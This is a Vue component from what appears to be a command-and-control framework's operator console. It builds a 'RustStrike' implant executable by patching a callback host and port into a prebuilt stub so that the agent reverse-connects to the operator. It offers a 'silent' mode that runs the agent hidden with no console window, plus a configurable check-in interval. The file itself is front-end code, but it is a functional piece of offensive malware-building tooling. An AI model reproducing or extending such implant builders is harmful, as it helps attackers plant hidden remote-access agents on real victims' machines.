<template>
  <div class="modal">
    <div class="modal-header">
      <h3><Download :size="14" /> Generate Agent</h3>
      <button @click="modalStore.close" class="close-btn"><X :size="18" /></button>
    </div>
    <div class="modal-body">
      <form @submit.prevent="submit">
        <div class="field">
          <label>Listener</label>
          <input :value="listener.name + ' (' + listener.protocol + ')'" readonly class="readonly" />
        </div>
        <div class="field">
          <label>Agent Template</label>
          <select v-model="form.agent_type" required>
            <option v-for="agent in availableAgents" :key="agent.id" :value="agent.id">
              {{ agent.name }} ({{ agent.id }})
            </option>
          </select>
        </div>
        <div class="field">
          <label>Callback Host (LHOST)</label>
          <input v-model="form.host" placeholder="e.g. 192.168.1.100" required />
          <p class="hint">The IP address the agent will connect to</p>
        </div>
        <div class="field">
          <label>Sleep Time (seconds)</label>
          <input v-model.number="form.sleep_time" type="number" min="1" max="3600" placeholder="e.g. 5" required />
          <p class="hint">Interval between agent check-ins (1-3600 seconds)</p>
        </div>
        <div class="field field-check">
          <label class="check">
            <input v-model="form.silent" type="checkbox" />
            <span>Silent (no console window)</span>
          </label>
          <p class="hint">GUI-subsystem agent — runs hidden in the background, no cmd window on launch. Command-exec BOFs already spawn their children hidden, so the whole agent is silent.</p>
        </div>
      </form>
    </div>
    <div class="modal-footer">
      <button class="btn" @click="modalStore.close">Cancel</button>
      <button class="btn primary" @click="submit" :disabled="loading">
        {{ loading ? 'Compiling Agent...' : 'Generate & Download' }}
      </button>
    </div>
  </div>
</template>

<script setup lang="ts">
import { reactive, ref, onMounted, watch } from 'vue'
import { X, Download } from 'lucide-vue-next'
import { useModalStore } from '../stores/modal'
import { useToastStore } from '../stores/toast'
import { getDefaultCallbackHost } from '../runtime/env'
import api from '../services/api'

const props = defineProps<{
  listener: any
}>()

const modalStore = useModalStore()
const toast = useToastStore()
const loading = ref(false)
const availableAgents = ref<Array<{ id: string; name: string; description: string }>>([])
const cacheKey = `ghost-generate-agent:${props.listener.id}`

const form = reactive({
  agent_type: '',
  host: getDefaultCallbackHost(),
  sleep_time: 5,
  silent: true
})

const loadCachedForm = () => {
  try {
    const raw = localStorage.getItem(cacheKey)
    if (!raw) return
    const cached = JSON.parse(raw)
    form.host = cached.host || form.host
    form.sleep_time = Number(cached.sleep_time || form.sleep_time)
    form.agent_type = cached.agent_type || form.agent_type
    form.silent = cached.silent ?? form.silent
  } catch {}
}

const saveCachedForm = () => {
  localStorage.setItem(cacheKey, JSON.stringify({
    host: form.host,
    sleep_time: form.sleep_time,
    agent_type: form.agent_type,
    silent: form.silent
  }))
}

const fetchAvailableAgents = async () => {
  // The stub builder produces a single implant variant (host:port trailer).
  // No per-listener agent menu in real mode; keep a single option for the UI.
  availableAgents.value = [{ id: 'ruststrike-implant', name: 'RustStrike Implant', description: 'BOF implant with baked-in callback' }]
  form.agent_type = 'ruststrike-implant'
}

const submit = async () => {
  if (!form.host) return
  loading.value = true
  try {
    // Build a patched implant stub via the Go core: it appends a host:port
    // trailer to a prebuilt ruststrike-implant.exe so the agent reverse-
    // connects with no CLI args. The port comes from the listener. The Go
    // bridge then pops the OS "Save As" dialog so the operator chooses where
    // to save the agent exe (no browser blob download, no fixed project path).
    const port = String(props.listener?.port ?? '')
    const safeName = String(props.listener?.name || 'agent').replace(/[^a-z0-9_-]/gi, '_')
    const name = `ruststrike_${safeName}_${form.host}_${port}`
    const res = await api.post('/stub/build', { host: form.host, port, name, silent: form.silent })
    const p = res.data?.data?.path
    if (!p) {
      // empty path = operator cancelled the Save As dialog
      modalStore.close()
      return
    }
    toast.success(`Agent stub saved: ${p}`)
    modalStore.close()
  } catch (err: any) {
    toast.error(err?.message || 'Agent generation failed')
  } finally {
    loading.value = false
  }
}

onMounted(() => {
  loadCachedForm()
  fetchAvailableAgents()
})

watch(form, () => {
  saveCachedForm()
}, { deep: true })
</script>

<style scoped>
.modal { width: 380px; background: var(--bg-2); border: 1px solid var(--bd); border-radius: 8px; box-shadow: 0 30px 60px rgba(0,0,0,0.6); }
.modal-header { padding: 16px; border-bottom: 1px solid var(--bd); display: flex; justify-content: space-between; align-items: center; }
.modal-header h3 { font-size: 14px; color: var(--pri); margin: 0; display: flex; align-items: center; gap: 8px; }
.close-btn { background: transparent; border: none; color: var(--tx-3); cursor: pointer; }
.modal-body { padding: 20px; }
.field { margin-bottom: 16px; }
.field label { display: block; font-size: 11px; color: var(--tx-2); margin-bottom: 8px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
.field input, .field select { width: 100%; background: var(--bg-3); border: 1px solid var(--bd); color: var(--tx); padding: 10px; border-radius: 4px; font-size: 12px; outline: none; transition: border-color 0.2s; }
.field input:focus, .field select:focus { border-color: var(--pri); }
.field input.readonly { background: var(--bg-4); cursor: default; border-style: dashed; }
.field-check { margin-bottom: 8px; }
.check { display: flex; align-items: center; gap: 8px; cursor: pointer; font-size: 12px; color: var(--tx); text-transform: none; letter-spacing: normal; font-weight: 500; margin-bottom: 0; }
.check input { width: auto; margin: 0; }
.hint { font-size: 10px; color: var(--tx-4); margin-top: 6px; font-style: italic; }
.modal-footer { padding: 12px 16px; border-top: 1px solid var(--bd); display: flex; justify-content: flex-end; gap: 10px; }
.btn { padding: 8px 16px; border-radius: 4px; font-size: 12px; cursor: pointer; border: 1px solid var(--bd); background: var(--bg-3); color: var(--tx); font-weight: 600; }
.btn.primary { background: var(--pri); color: var(--on-pri, #062235); border: none; }
.btn:disabled { opacity: 0.5; cursor: not-allowed; }
</style>
